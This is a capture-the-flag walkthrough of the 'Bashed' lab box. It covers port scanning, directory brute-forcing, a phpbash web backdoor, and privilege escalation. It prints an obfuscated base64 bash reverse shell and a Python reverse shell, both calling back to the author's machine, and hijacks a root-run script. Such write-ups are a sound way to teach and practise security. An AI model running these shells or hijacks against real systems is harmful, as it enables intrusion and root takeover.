# Box: Bashed

> Damiano Gubiani | 1/5/2026

export the box ip

```bash
export IP='10.129.29.47'
```

# Enumerating

## NMAP

running nmap to scan for open ports

command

```bash
sudo nmap -sSCV -oN nmap/fst -T4 -vv --min-rate 10000 $IP
```

output

```
Nmap scan report for 10.129.29.47
Host is up, received reset ttl 63 (0.053s latency).
Scanned at 2026-04-30 21:48:38 EDT for 7s
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

## WebApp

after connecting to the webapp we found something interesting , they have a backdoor installed to the website

![](Screen/Pasted%20image%2020260501172604.png)

lets run a directory bruteforce to see where the backdoor is installed with gobuster

command

```bash
gobuster dir -u http://10.129.29.47/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200 --no-error -x php,html,txt
```

output

![](Screen/Pasted%20image%2020260501173526.png)

theres an interesting folder called dev and upon entering we found the phpbash backdoor

![](Screen/Pasted%20image%2020260501173613.png)

# Exploit
## RCE

now we need to upgrade this shell so i started a listener and connected back to my kali machine

listener

```
rlwrap nc -lvvnp 4444
```

reverse shell 

```bash
echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjU0LzQ0NDQgMD4mMQ==|base64 -d|bash
```

and after sending the command we got a callback

![](Screen/Pasted%20image%2020260501174506.png)

## LPE

checking for privilege we found this

![](Screen/Pasted%20image%2020260501174733.png)

so i just ran a simple sudo command to get into a bash with the user scriptmanager

```bash
sudo -u scriptmanager /bin/bash
```

and then i upgraded the session into a TTY 

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

![](Screen/Pasted%20image%2020260501175131.png)

checking the root folder theres a strange folder called scripts that holds 2 test files

![](Screen/Pasted%20image%2020260501181238.png)

checking the owners of the files we can assume that this script is run by root

![](Screen/Pasted%20image%2020260501181341.png)

so if we load a reverse shell in the python script we sould get a root shell

## Exploit crafting

so i run locally a listener on the port 4445

```bash
rlwrap nc -lvvnp 4445
```

than on the victim machine i copy paste a simple python reverse shell 

```bash
cat > test.py << EOF
import socket, subprocess, os
import pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.15.54", 4445))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
>> EOF
```

and after some minutes i got a reverse shell as root

![](Screen/Pasted%20image%2020260501182158.png)






